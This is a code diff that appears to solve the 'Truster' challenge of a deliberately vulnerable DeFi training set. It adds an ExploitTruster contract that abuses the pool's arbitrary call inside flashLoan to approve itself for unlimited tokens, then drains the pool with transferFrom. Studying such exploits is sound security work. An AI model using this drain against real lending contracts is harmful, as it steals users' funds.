@@ -31,12 +31,30 @@ contract TrusterLenderPool is ReentrancyGuard {
     {
         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
+
         damnValuableToken.transfer(borrower, borrowAmount);
         target.functionCall(data);
 
         uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
     }
+}
 
+contract ExploitTruster {
+    IERC20 public immutable token;
+    TrusterLenderPool public immutable pool;
+    uint constant public MAX_INT_NUMBER = 2**256 - 1;
+
+    constructor (address _pool, address _token) {
+        pool = TrusterLenderPool(_pool);
+        token = IERC20(_token);
+    }
+
+    function drainFundsFromPool () public {
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), MAX_INT_NUMBER);
+
+        pool.flashLoan(0, msg.sender, address(token), data);
+
+        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
+    }
 }
